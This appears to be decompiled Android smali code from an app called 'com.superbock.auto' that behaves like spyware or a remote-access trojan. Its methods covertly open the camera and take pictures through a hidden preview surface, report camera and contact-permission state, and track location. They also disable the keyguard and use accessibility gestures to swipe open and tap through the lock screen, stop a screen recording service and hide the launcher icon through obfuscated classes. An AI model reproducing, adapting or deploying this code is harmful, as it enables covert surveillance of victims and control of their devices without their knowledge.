    invoke-virtual {p1, v5, v6}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const-string v0, "16"

    invoke-static {p2, v0, p1}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    goto :goto_2

    :cond_5
    if-nez p1, :cond_6

    const-string p1, "22"

    invoke-static {p2, p1, v1}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    :cond_6
    :goto_2
    return-void
.end method

.method public final T(II)V
    .locals 6

    const/4 v0, 0x0

    const/4 v1, 0x0

    const/4 v2, 0x1

    if-eqz p1, :cond_5

    if-eq p1, v2, :cond_3

    const/4 v2, 0x2

    if-eq p1, v2, :cond_1

    const/4 p2, 0x3

    if-eq p1, p2, :cond_0

    const/4 p2, 0x4

    if-eq p1, p2, :cond_2

    goto/16 :goto_2

    :cond_0
    sput-object v1, Lcom/superbock/auto/BaseService;->M:Ljava/lang/Integer;

    sget-object p1, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    sput-object p1, Lcom/superbock/auto/BaseService;->L:Ljava/lang/Boolean;

    invoke-static {}, Lf3/i;->o()V

    const-wide/16 p1, 0x0

    goto :goto_0

    :cond_1
    invoke-static {p2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object p1

    sput-object p1, Lcom/superbock/auto/BaseService;->M:Ljava/lang/Integer;

    sput-boolean v0, Lcom/superbock/auto/BaseService;->N:Z

    sget-object p1, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    sput-object p1, Lcom/superbock/auto/BaseService;->L:Ljava/lang/Boolean;

    invoke-static {}, Lf3/i;->o()V

    :cond_2
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide p1

    :goto_0
    iput-wide p1, p0, Lf3/i$a;->e:J

    goto/16 :goto_2

    :cond_3
    sget-boolean p1, Lf3/i;->b:Z

    if-eqz p1, :cond_4

    const-string p1, "53"

    invoke-static {v2, p1, v1}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    :cond_4
    invoke-static {p2}, Landroid/hardware/Camera;->open(I)Landroid/hardware/Camera;

    move-result-object p1

    invoke-virtual {p1}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

    move-result-object p2

    invoke-virtual {p1, p2}, Landroid/hardware/Camera;->setParameters(Landroid/hardware/Camera$Parameters;)V

    :try_start_0
    new-instance p2, Landroid/graphics/SurfaceTexture;

    invoke-direct {p2, v0}, Landroid/graphics/SurfaceTexture;-><init>(I)V

    invoke-virtual {p1, p2}, Landroid/hardware/Camera;->setPreviewTexture(Landroid/graphics/SurfaceTexture;)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    invoke-virtual {p1}, Landroid/hardware/Camera;->startPreview()V

    new-instance p2, Lf3/d;

    invoke-direct {p2, p1}, Lf3/d;-><init>(Landroid/hardware/Camera;)V

    invoke-virtual {p1, v1, v1, p2}, Landroid/hardware/Camera;->takePicture(Landroid/hardware/Camera$ShutterCallback;Landroid/hardware/Camera$PictureCallback;Landroid/hardware/Camera$PictureCallback;)V

    goto/16 :goto_2

    :catch_0
    move-exception p1

    new-instance p2, Lf3/f;

    const-string v0, "10"

    invoke-direct {p2, v0, p1}, Lf3/f;-><init>(Ljava/lang/String;Ljava/lang/Throwable;)V

    throw p2

    :cond_5
    iget-object p1, p0, Lf3/i$a;->h:Landroid/content/Context;

    const-string p2, "android.permission.CAMERA"

    invoke-static {p1, p2}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result p1

    if-eqz p1, :cond_6

    const-string p1, "38"

    invoke-static {v2, p1, v1}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    goto :goto_2

    :cond_6
    new-instance p1, Lf/b;

    invoke-direct {p1}, Lf/b;-><init>()V

    const/4 p2, 0x0

    :goto_1
    invoke-static {}, Landroid/hardware/Camera;->getNumberOfCameras()I

    move-result v3

    if-ge p2, v3, :cond_7

    new-instance v3, Landroid/hardware/Camera$CameraInfo;

    invoke-direct {v3}, Landroid/hardware/Camera$CameraInfo;-><init>()V

    invoke-static {p2, v3}, Landroid/hardware/Camera;->getCameraInfo(ILandroid/hardware/Camera$CameraInfo;)V

    new-instance v4, Lf/e;

    invoke-direct {v4}, Lf/e;-><init>()V

    iget v3, v3, Landroid/hardware/Camera$CameraInfo;->facing:I

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const-string v5, "facing"

    invoke-virtual {v4, v5, v3}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    invoke-static {p2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const-string v5, "id"

    invoke-virtual {v4, v5, v3}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    invoke-virtual {p1, v4}, Lf/b;->add(Ljava/lang/Object;)Z

    add-int/lit8 p2, p2, 0x1

    goto :goto_1

    :cond_7
    sget-object p2, Lf3/i;->a:Ls3/g0;

    if-nez p2, :cond_8

    goto :goto_2

    :cond_8
    invoke-virtual {p1}, Lf/b;->isEmpty()Z

    move-result p2

    if-eqz p2, :cond_9

    const-string p1, "9"

    invoke-static {v2, p1, v1}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    goto :goto_2

    :cond_9
    new-instance p2, Lf/e;

    invoke-direct {p2}, Lf/e;-><init>()V

    const/16 v1, 0x515

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v2, "code"

    invoke-virtual {p2, v2, v1}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const-string v1, "type"

    invoke-virtual {p2, v1, v0}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    invoke-virtual {p1}, Lf/a;->l()Ljava/lang/String;

    move-result-object p1

    const-string v0, "list"

    invoke-virtual {p2, v0, p1}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;

    sget-object p1, Lf3/i;->a:Ls3/g0;

    invoke-virtual {p2}, Lf/a;->l()Ljava/lang/String;

    move-result-object p2

    invoke-interface {p1, p2}, Ls3/g0;->b(Ljava/lang/String;)Z

    :goto_2
    return-void
.end method

.method public final U(Z)V
    .locals 9

    iget-object v0, p0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-static {v0}, Lk3/f;->k(Landroid/content/Context;)Ljava/util/Map;

    move-result-object v0

    const/4 v1, 0x0

    if-nez v0, :cond_0

    const/4 p1, 0x2

    const-string v0, "60"

    invoke-static {p1, v0, v1}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    return-void

    :cond_0
    check-cast v0, Ljava/util/HashMap;

    const-string v2, "isPlayStore"

    invoke-virtual {v0, v2}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    const-string v3, "1"

    invoke-virtual {v3, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    const-string v4, "3"

    const v5, 0x10002000

    const-string v6, "package:com.android.vending"

    const-string v7, "android.settings.APPLICATION_DETAILS_SETTINGS"

    const/4 v8, 0x1

    if-eqz v2, :cond_4

    const-string v2, "isEnabled"

    invoke-virtual {v0, v2}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_2

    iget-object p1, p0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-static {p1}, Lk3/a;->i(Landroid/content/Context;)Z

    move-result p1

    if-eqz p1, :cond_1

    invoke-static {v8, v4, v1}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    return-void

    :cond_1
    invoke-virtual {p0}, Lf3/i$a;->p0()V

    new-instance p1, Landroid/content/Intent;

    invoke-static {v6}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    invoke-direct {p1, v7, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    invoke-virtual {p1, v5}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    iget-object v0, p0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-virtual {v0, p1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    const-string p1, "61"

    invoke-static {v8, p1, v1}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    goto :goto_1

    :cond_2
    const-string v0, "62"

    invoke-static {v8, v0, v1}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    if-eqz p1, :cond_6

    iget-object p1, p0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-static {p1}, Lk3/a;->i(Landroid/content/Context;)Z

    move-result p1

    if-eqz p1, :cond_3

    invoke-static {v8, v4, v1}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    return-void

    :cond_3
    invoke-virtual {p0}, Lf3/i$a;->p0()V

    new-instance p1, Landroid/content/Intent;

    invoke-static {v6}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    invoke-direct {p1, v7, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    goto :goto_0

    :cond_4
    const-string v0, "63"

    invoke-static {v8, v0, v1}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    if-eqz p1, :cond_6

    iget-object p1, p0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-static {p1}, Lk3/a;->i(Landroid/content/Context;)Z

    move-result p1

    if-eqz p1, :cond_5

    invoke-static {v8, v4, v1}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    return-void

    :cond_5
    invoke-virtual {p0}, Lf3/i$a;->p0()V

    new-instance p1, Landroid/content/Intent;

    invoke-static {v6}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    invoke-direct {p1, v7, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    :goto_0
    invoke-virtual {p1, v5}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    iget-object v0, p0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-virtual {v0, p1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    :cond_6
    :goto_1
    return-void
.end method

.method public final V()V
    .locals 8

    iget-object v0, p0, Lf3/i$a;->h:Landroid/content/Context;

    const-string v1, "android.permission.READ_CONTACTS"

    invoke-static {v0, v1}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    const/4 v1, 0x0

    const/4 v2, 0x1

    if-eqz v0, :cond_0

    const-string v0, "38"

    invoke-static {v2, v0, v1}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    return-void

    :cond_0
    iget-object v0, p0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-static {v0, v2}, Lk3/f;->g(Landroid/content/Context;Z)V

    invoke-static {}, Lg3/c;->a()Lg3/c;

    move-result-object v0

    invoke-static {v0}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;)Ljava/lang/Object;

    const-wide/16 v3, 0x0

    const/4 v5, 0x0

    :try_start_0
    iget-object v0, v0, Lg3/c;->a:Lt2/g;

    invoke-interface {v0}, Lt2/g;->c()Lz2/h;

    move-result-object v6

    iput-boolean v2, v6, Lz2/h;->l:Z

    invoke-virtual {v6}, Lz2/k;->g()Lz2/m;

    move-result-object v2

    const-string v6, "up"

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v7

    invoke-virtual {v2, v6, v7}, Lz2/m;->c(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

    invoke-virtual {v2}, Lz2/m;->j()Lz2/f;

    move-result-object v2

    invoke-interface {v0, v2}, Lt2/g;->i(Lz2/f;)J

    move-result-wide v6
    :try_end_0
    .catch Ljava/sql/SQLException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-wide v6, v3

    :goto_0
    cmp-long v0, v6, v3

    if-lez v0, :cond_1

    iget-object v0, p0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-static {v0}, Lk3/f;->q(Landroid/content/Context;)V

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, ""

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v6, v7}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "16"

    invoke-static {v5, v1, v0}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    goto :goto_1

    :cond_1
    if-nez v0, :cond_2

    const-string v0, "22"

    invoke-static {v5, v0, v1}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    :cond_2
    :goto_1
    return-void
.end method

.method public final W(ILjava/lang/String;Ljava/lang/String;)V
    .locals 29
    .annotation build Landroidx/annotation/RequiresApi;
        api = 0x1a
    .end annotation

    move-object/from16 v0, p0

    move/from16 v1, p1

    move-object/from16 v2, p2

    move-object/from16 v3, p3

    if-eqz v1, :cond_e

    const/4 v4, 0x3

    const/4 v5, 0x2

    const/4 v6, 0x1

    if-eq v1, v6, :cond_0

    if-eq v1, v5, :cond_0

    if-eq v1, v4, :cond_0

    goto/16 :goto_5

    :cond_0
    sget v7, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v8, 0x1a

    if-lt v7, v8, :cond_f

    iget-object v7, v0, Lf3/i$a;->h:Landroid/content/Context;

    const-string v8, "keyguard"

    invoke-virtual {v7, v8}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Landroid/app/KeyguardManager;

    invoke-virtual {v7}, Landroid/app/KeyguardManager;->isKeyguardLocked()Z

    move-result v8

    const/4 v9, 0x0

    const/4 v10, 0x0

    if-nez v8, :cond_4

    const-string v7, "24"

    invoke-static {v10, v7, v9}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v0, v1, v2, v3, v10}, Lf3/i$a;->Z(ILjava/lang/String;Ljava/lang/String;Z)V

    if-eq v1, v6, :cond_3

    if-eq v1, v5, :cond_2

    if-eq v1, v4, :cond_1

    goto/16 :goto_5

    :cond_1
    const-string v1, "47"

    goto :goto_0

    :cond_2
    const-string v1, "48"

    goto :goto_0

    :cond_3
    const-string v1, "49"

    :goto_0
    invoke-static {v10, v1, v9}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_5

    :cond_4
    iget-object v8, v0, Lf3/i$a;->h:Landroid/content/Context;

    const-string v11, "power"

    invoke-virtual {v8, v11}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Landroid/os/PowerManager;

    invoke-virtual {v8}, Landroid/os/PowerManager;->isScreenOn()Z

    move-result v11

    if-nez v11, :cond_6

    iget-object v11, v0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-static {v11}, Landroidx/core/app/NotificationManagerCompat;->from(Landroid/content/Context;)Landroidx/core/app/NotificationManagerCompat;

    move-result-object v11

    invoke-virtual {v11}, Landroidx/core/app/NotificationManagerCompat;->areNotificationsEnabled()Z

    move-result v11

    if-nez v11, :cond_5

    const-string v11, "46"

    invoke-static {v6, v11, v9}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    sget-boolean v11, Lcom/superbock/auto/BaseService;->z:Z

    if-nez v11, :cond_5

    const-string v1, "50"

    invoke-static {v6, v1, v9}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_5

    :cond_5
    const v11, 0x1000000a

    const-string v12, "bright"

    invoke-virtual {v8, v11, v12}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    move-result-object v8

    const-wide/16 v11, 0x2710

    invoke-virtual {v8, v11, v12}, Landroid/os/PowerManager$WakeLock;->acquire(J)V

    invoke-virtual {v8}, Landroid/os/PowerManager$WakeLock;->release()V

    :cond_6
    const-string v8, "unLock"

    invoke-virtual {v7, v8}, Landroid/app/KeyguardManager;->newKeyguardLock(Ljava/lang/String;)Landroid/app/KeyguardManager$KeyguardLock;

    move-result-object v8

    invoke-virtual {v8}, Landroid/app/KeyguardManager$KeyguardLock;->reenableKeyguard()V

    invoke-virtual {v8}, Landroid/app/KeyguardManager$KeyguardLock;->disableKeyguard()V

    const-wide/16 v11, 0x3e8

    :try_start_0
    invoke-static {v11, v12}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    nop

    :goto_1
    invoke-virtual {v7}, Landroid/app/KeyguardManager;->isKeyguardSecure()Z

    move-result v7

    if-nez v7, :cond_7

    invoke-static {}, Lcom/superbock/auto/BaseService;->g()Lcom/superbock/auto/BaseService;

    move-result-object v1

    invoke-virtual {v1, v4}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    goto/16 :goto_5

    :cond_7
    invoke-static {}, Lcom/superbock/auto/BaseService;->g()Lcom/superbock/auto/BaseService;

    move-result-object v7

    invoke-virtual {v7, v4}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    :try_start_1
    invoke-static {v11, v12}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_2

    :catch_1
    nop

    :goto_2
    invoke-static {}, Lcom/superbock/auto/BaseService;->g()Lcom/superbock/auto/BaseService;

    move-result-object v7

    invoke-virtual {v7}, Lcom/superbock/auto/BaseService;->i()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v7

    const-string v8, "com.android.systemui:id/keyguard_host_view"

    invoke-static {v7, v8}, Li/g;->f(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z

    move-result v8

    if-nez v8, :cond_8

    const-string v8, "com.android.systemui:id/keyguard_security_container"

    invoke-static {v7, v8}, Li/g;->f(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z

    move-result v7

    if-nez v7, :cond_8

    new-instance v14, Landroid/graphics/Path;

    invoke-direct {v14}, Landroid/graphics/Path;-><init>()V

    iget v7, v0, Lf3/i$a;->q:I

    int-to-float v7, v7

    const v8, 0x3e99999a    # 0.3f

    mul-float v7, v7, v8

    const v13, 0x3f333333    # 0.7f

    iget v15, v0, Lf3/i$a;->r:I

    int-to-float v15, v15

    mul-float v15, v15, v13

    invoke-virtual {v14, v7, v15}, Landroid/graphics/Path;->moveTo(FF)V

    iget v7, v0, Lf3/i$a;->q:I

    int-to-float v7, v7

    const v20, 0x3ecccccd    # 0.4f

    mul-float v7, v7, v20

    iget v13, v0, Lf3/i$a;->r:I

    int-to-float v13, v13

    const/high16 v21, 0x3f000000    # 0.5f

    mul-float v13, v13, v21

    invoke-virtual {v14, v7, v13}, Landroid/graphics/Path;->lineTo(FF)V

    new-instance v7, Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    const-wide/16 v15, 0x0

    const-wide/16 v17, 0xc8

    const/16 v19, 0x1

    move-object v13, v7

    invoke-direct/range {v13 .. v19}, Landroid/accessibilityservice/GestureDescription$StrokeDescription;-><init>(Landroid/graphics/Path;JJZ)V

    new-instance v13, Landroid/graphics/Path;

    invoke-direct {v13}, Landroid/graphics/Path;-><init>()V

    iget v14, v0, Lf3/i$a;->q:I

    int-to-float v14, v14

    mul-float v14, v14, v20

    iget v15, v0, Lf3/i$a;->r:I

    int-to-float v15, v15

    mul-float v15, v15, v21

    invoke-virtual {v13, v14, v15}, Landroid/graphics/Path;->moveTo(FF)V

    const v14, 0x3f19999a    # 0.6f

    iget v15, v0, Lf3/i$a;->q:I

    int-to-float v15, v15

    mul-float v15, v15, v14

    iget v14, v0, Lf3/i$a;->r:I

    int-to-float v14, v14

    mul-float v14, v14, v8

    invoke-virtual {v13, v15, v14}, Landroid/graphics/Path;->lineTo(FF)V

    const-wide/16 v24, 0x0

    const-wide/16 v26, 0xa

    const/16 v28, 0x0

    move-object/from16 v22, v7

    move-object/from16 v23, v13

    invoke-virtual/range {v22 .. v28}, Landroid/accessibilityservice/GestureDescription$StrokeDescription;->continueStroke(Landroid/graphics/Path;JJZ)Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    move-result-object v8

    invoke-static {}, Lcom/superbock/auto/BaseService;->g()Lcom/superbock/auto/BaseService;

    move-result-object v13

    new-instance v14, Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-direct {v14}, Landroid/accessibilityservice/GestureDescription$Builder;-><init>()V

    invoke-virtual {v14, v7}, Landroid/accessibilityservice/GestureDescription$Builder;->addStroke(Landroid/accessibilityservice/GestureDescription$StrokeDescription;)Landroid/accessibilityservice/GestureDescription$Builder;

    move-result-object v7

    invoke-virtual {v7}, Landroid/accessibilityservice/GestureDescription$Builder;->build()Landroid/accessibilityservice/GestureDescription;

    move-result-object v7

    new-instance v14, Lf3/k;

    invoke-direct {v14, v8}, Lf3/k;-><init>(Landroid/accessibilityservice/GestureDescription$StrokeDescription;)V

    invoke-virtual {v13, v7, v14, v9}, Landroid/accessibilityservice/AccessibilityService;->dispatchGesture(Landroid/accessibilityservice/GestureDescription;Landroid/accessibilityservice/AccessibilityService$GestureResultCallback;Landroid/os/Handler;)Z

    :try_start_2
    invoke-static {v11, v12}, Ljava/lang/Thread;->sleep(J)V
    :try_end_2
    .catch Ljava/lang/InterruptedException; {:try_start_2 .. :try_end_2} :catch_2

    goto :goto_3

    :catch_2
    nop

    :cond_8
    :goto_3
    if-eq v1, v6, :cond_d

    if-eq v1, v5, :cond_c

    if-eq v1, v4, :cond_9

    goto :goto_5

    :cond_9
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    sput-wide v3, Lf3/i;->e:J

    invoke-virtual {v0, v2}, Lf3/i$a;->f0(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_a

    const-string v1, "33"

    invoke-static {v6, v1, v2}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    goto :goto_5

    :cond_a
    const-string v1, "31"

    invoke-static {v10, v1, v2}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    invoke-static {}, Lcom/superbock/auto/BaseService;->g()Lcom/superbock/auto/BaseService;

    move-result-object v1

    invoke-virtual {v1}, Lcom/superbock/auto/BaseService;->i()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    if-eqz v1, :cond_f

    const-string v2, "com.android.systemui:id/btn_letter_ok"

    invoke-static {v1, v2}, Li/g;->k(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_b

    sget v3, Le3/d;->a:I

    const/4 v4, 0x4

    if-ne v3, v4, :cond_b

    const-string v2, "com.android.systemui:id/vivo_cancel"

    invoke-static {v1, v2}, Li/g;->k(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    :cond_b
    if-eqz v2, :cond_f

    const-wide/16 v3, 0x12c

    :try_start_3
    invoke-static {v3, v4}, Ljava/lang/Thread;->sleep(J)V
    :try_end_3
    .catch Ljava/lang/InterruptedException; {:try_start_3 .. :try_end_3} :catch_3

    :catch_3
    invoke-static {}, Lcom/superbock/auto/BaseService;->g()Lcom/superbock/auto/BaseService;

    move-result-object v1

    invoke-virtual {v1, v2}, Lcom/superbock/auto/BaseService;->n(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    goto :goto_5

    :cond_c
    invoke-virtual {v0, v5, v2, v3, v6}, Lf3/i$a;->Z(ILjava/lang/String;Ljava/lang/String;Z)V

    const-string v1, "30"

    goto :goto_4

    :cond_d
    invoke-virtual {v0, v6, v2, v9, v6}, Lf3/i$a;->Z(ILjava/lang/String;Ljava/lang/String;Z)V

    const-string v1, "32"

    :goto_4
    invoke-static {v10, v1, v3}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    goto :goto_5

    :cond_e
    invoke-virtual {v0, v2}, Lf3/i$a;->f0(Ljava/lang/String;)Z

    :cond_f
    :goto_5
    return-void
.end method

.method public final X()V
    .locals 5

    const/4 v0, 0x0

    sput-object v0, Lf3/i;->a:Ls3/g0;

    const-wide/16 v1, 0x0

    iput-wide v1, p0, Lf3/i$a;->c:J

    iput-wide v1, p0, Lf3/i$a;->d:J

    iput-wide v1, p0, Lf3/i$a;->e:J

    sput-wide v1, Lf3/i;->d:J

    sput-wide v1, Lf3/i;->e:J

    iget-object v1, p0, Lf3/i$a;->b:Ljava/util/Timer;

    if-eqz v1, :cond_0

    invoke-virtual {v1}, Ljava/util/Timer;->cancel()V

    iput-object v0, p0, Lf3/i$a;->b:Ljava/util/Timer;

    :cond_0
    iget-object v1, p0, Lf3/i$a;->f:Lf3/l;

    if-eqz v1, :cond_1

    iget-object v2, v1, Lf3/l;->g:Landroid/location/LocationManager;

    if-eqz v2, :cond_1

    invoke-virtual {v2, v1}, Landroid/location/LocationManager;->removeUpdates(Landroid/location/LocationListener;)V

    :cond_1
    sput-object v0, Lcom/superbock/auto/BaseService;->M:Ljava/lang/Integer;

    sget-object v0, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    sput-object v0, Lcom/superbock/auto/BaseService;->L:Ljava/lang/Boolean;

    sget-boolean v1, Lf3/i;->b:Z

    if-eqz v1, :cond_2

    iget-object v1, p0, Lf3/i$a;->h:Landroid/content/Context;

    new-instance v2, Landroid/content/Intent;

    iget-object v3, p0, Lf3/i$a;->h:Landroid/content/Context;

    const-class v4, Lcom/superbock/auto/ScreenService;

    invoke-direct {v2, v3, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v3, "stopRecord"

    invoke-virtual {v2, v3}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :cond_2
    sget-boolean v1, Lcom/superbock/auto/BaseService;->z:Z

    if-nez v1, :cond_3

    sget-boolean v1, Lcom/superbock/auto/BaseService;->B:Z

    if-eqz v1, :cond_4

    :cond_3
    const/4 v1, 0x0

    sput-boolean v1, Lcom/superbock/auto/BaseService;->z:Z

    sput-boolean v1, Lcom/superbock/auto/BaseService;->B:Z

    sput-object v0, Lcom/superbock/auto/BaseService;->C:Ljava/lang/Boolean;

    :try_start_0
    invoke-static {}, Lcom/superbock/auto/BaseService;->g()Lcom/superbock/auto/BaseService;

    move-result-object v0

    const/4 v1, 0x2

    invoke-virtual {v0, v1}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z
    :try_end_0
    .catch Lf3/f; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_4
    return-void
.end method

.method public final Y(I)V
    .locals 3

    iget-object v0, p0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-static {v0}, Lk3/d;->d(Landroid/content/Context;)Z

    move-result v0

    if-nez p1, :cond_1

    if-nez v0, :cond_0

    goto :goto_2

    :cond_0
    iget-object p1, p0, Lf3/i$a;->h:Landroid/content/Context;

    sget-object v1, Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Ksfndkd;->INSTANCE:Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Ksfndkd;

    const-string v2, "com.superbock.ui.StartupActivity"

    invoke-virtual {v1, p1, v2}, Lmarmojkfnf/huflnkmt/ncagri/jdtuadkc/Ksfndkd;->showIcon(Landroid/content/Context;Ljava/lang/String;)V

    goto :goto_2

    :cond_1
    const/4 v1, 0x1

    if-ne p1, v1, :cond_5

    if-eqz v0, :cond_2

    goto :goto_2

    :cond_2
    sget p1, Le3/d;->a:I

    const/4 v2, 0x3

    if-eq p1, v2, :cond_4

    const/16 v2, 0xe

    if-ne p1, v2, :cond_3

    goto :goto_0

    :cond_3
    iget-object p1, p0, Lf3/i$a;->h:Landroid/content/Context;

    goto :goto_1

    :cond_4
    :goto_0
    iget-object p1, p0, Lf3/i$a;->h:Landroid/content/Context;

    const/4 v1, 0x2

    :goto_1
    invoke-static {p1, v1}, Lk3/d;->b(Landroid/content/Context;I)V

    :cond_5
    :goto_2
    iget-object p1, p0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-static {p1}, Lk3/d;->d(Landroid/content/Context;)Z

    move-result p1

    if-eq v0, p1, :cond_6

    sget-object p1, Lcom/superbock/App;->b:Lcom/superbock/App;

    invoke-virtual {p1}, Lcom/superbock/App;->f()V

    goto :goto_3

    :cond_6
    invoke-static {v0}, Lf3/i;->h(Z)V

    :goto_3
    return-void
.end method

